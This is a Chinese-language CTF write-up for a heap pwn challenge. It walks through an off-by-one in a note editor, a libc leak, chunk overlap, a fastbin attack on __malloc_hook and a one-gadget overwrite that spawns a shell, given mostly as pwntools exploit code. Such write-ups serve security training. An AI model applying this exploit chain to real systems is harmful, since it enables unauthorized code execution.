# E99p1ant_Note

## 题目简述

便签编辑函数的循环边界多读了 1 字节，形成 off-by-one。通过修改下一块的 `size` 低字节，可以制造覆盖相邻 fastbin 块的大 chunk；随后伪造 `0x71` 大小的空闲块并把 fastbin 链指向 `__malloc_hook-0x23`，最终写入 one-gadget。

## 解题过程

先申请若干相邻堆块，并准备一个保存 `/bin/sh` 的块：

```python
add(0x88, b"A")
add(0x88, b"B")
add(0x78, b"C")
add(0x68, b"D")
add(0x88, b"/bin/sh\x00")
```

与上一题相同，释放、重新申请并 `show` 第 0 块，从 unsorted-bin 残留指针计算 libc 基址。题目使用 glibc 2.23 时可按 `main_arena+88` 对齐到 `__malloc_hook+0x68`：

```python
delete(0)
add(0x88, b"")
show(0)
io.recvuntil(b"content:")
leak = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = leak - (libc.sym["__malloc_hook"] + 0x68)
```

第 1 块可写满 `0x88` 字节后再多写 1 字节。把相邻块的 `size` 低字节改为 `0xf1`，使分配器把后面的区域看成更大的 `0xf0` chunk：

```python
edit(1, b"\x00" * 0x88 + b"\xf1")
delete(2)
delete(3)
```

重新申请覆盖这段区域的大块，在其中伪造一个 `size=0x71` 的 fastbin chunk，并把其 `fd` 指向 `__malloc_hook-0x23`：

```python
payload = b"\x00" * 0x78
payload += p64(0x71)
payload += p64(libc.sym["__malloc_hook"] - 0x23)
add(0xd8, payload)
```

之后两次申请 `0x68`。第一次取走正常 fastbin 节点，第二次返回到 `__malloc_hook-0x23`。在 hook 前补 19 字节即可让 one-gadget 地址落到 `__malloc_hook`：

```python
one_gadget = libc.address + 0xf1147

add(0x68, b"E")
add(0x68, b"A" * 19 + p64(one_gadget))

# 再触发一次 malloc
io.sendlineafter(b":", b"1")
io.sendlineafter(b"size?", b"1")
io.interactive()
```

`0xf1147` 的约束是 `[rsp+0x70] == NULL`，应在实际触发点用调试器确认；若栈条件不满足，需要换用同一 libc 的其他 one-gadget，而不是只替换一个随意偏移。

## 方法总结

- 核心链路：off-by-one 改下一块大小、制造重叠区域、fastbin attack 定位 `__malloc_hook`、one-gadget 劫持分配流程。
- 关键细节：申请尺寸、实际 chunk size、伪造 `0x71` 头和 `-0x23` 对齐共同决定落点，任意一项错误都会触发分配器检查或写偏。
- 复用要点：hook、fastbin 检查和 one-gadget 约束高度依赖 libc；现代 glibc 已移除 malloc hooks，不能把这条链当作跨版本模板。
